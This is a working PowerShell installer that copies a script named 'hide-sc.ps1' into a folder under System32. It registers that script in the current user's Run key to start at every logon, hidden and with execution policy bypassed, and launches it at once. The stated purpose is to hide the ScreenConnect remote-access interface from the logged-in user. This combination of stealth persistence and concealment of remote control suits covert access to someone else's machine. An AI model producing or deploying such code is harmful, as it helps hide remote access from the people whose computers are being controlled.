# Install ScreenConnect hider to C:\Windows\System32\hide
$ErrorActionPreference = 'Stop'
$ScriptDir  = Split-Path -Parent $MyInvocation.MyCommand.Path
$InstallDir = Join-Path $env:SystemRoot 'System32\hide'
$HideScript = Join-Path $InstallDir 'hide-sc.ps1'
$RunKey     = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$ValueName  = 'HideScreenConnectUI'
$LogFile    = Join-Path $env:TEMP 'sc_hide.log'

function Write-Log($msg) {
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg" | Out-File -FilePath $LogFile -Append -Encoding UTF8
}

try {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null

    Get-ChildItem -LiteralPath $ScriptDir -File | Copy-Item -Destination $InstallDir -Force

    if (-not (Test-Path -LiteralPath $HideScript)) {
        throw "hide-sc.ps1 not found after copy: $HideScript"
    }

    $psExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    if (-not (Test-Path -LiteralPath $psExe)) {
        throw "powershell.exe not found: $psExe"
    }

    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*hide-sc.ps1*' } |
        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

    schtasks /Delete /TN $ValueName /F 2>$null | Out-Null
    Unregister-ScheduledTask -TaskName $ValueName -Confirm:$false -ErrorAction SilentlyContinue

    $runValue = "`"$psExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$HideScript`""
    Set-ItemProperty -Path $RunKey -Name $ValueName -Value $runValue -Force

    Start-Process -FilePath $psExe -ArgumentList @(
        '-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', $HideScript
    ) -WindowStyle Hidden

    Write-Log "Installed to $InstallDir via Registry Run key: $runValue"
    Write-Host ''
    Write-Host "SUCCESS - Installed to $InstallDir" -ForegroundColor Green
    Write-Host '  Hider runs in background. You can close this window.' -ForegroundColor Green
    Write-Host '  Starts again every time you log in.' -ForegroundColor Green
    Write-Host ''
}
catch {
    Write-Log "ERROR: $($_.Exception.Message)"
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Log : $LogFile"
    exit 1
}
